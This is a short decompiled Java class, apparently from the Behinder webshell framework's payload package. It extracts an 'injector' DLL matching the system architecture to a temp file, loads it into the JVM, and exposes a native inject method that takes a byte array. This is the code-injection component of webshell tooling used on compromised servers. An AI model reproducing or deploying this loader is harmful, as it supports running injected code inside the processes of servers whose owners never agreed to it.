package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class LoadLibrary {
   public void loadLibrary() {
      try {
         String var1 = "injector.dll";
         if (System.getProperty("os.arch").contains("64")) {
            var1 = "injector64.dll";
         }

         InputStream var2 = this.getClass().getClassLoader().getResourceAsStream(var1);
         byte[] var3 = new byte[524288];
         int var4 = var2.read(var3);
         var2.close();
         File var5 = File.createTempFile("injector", ".dll");
         var5.deleteOnExit();
         FileOutputStream var6 = new FileOutputStream(var5, false);
         var6.write(var3, 0, var4);
         var6.close();
         System.load(var5.getAbsolutePath());
      } catch (Throwable var7) {
         var7.printStackTrace();
      }

   }

   public native void inject(byte[] var1);
}
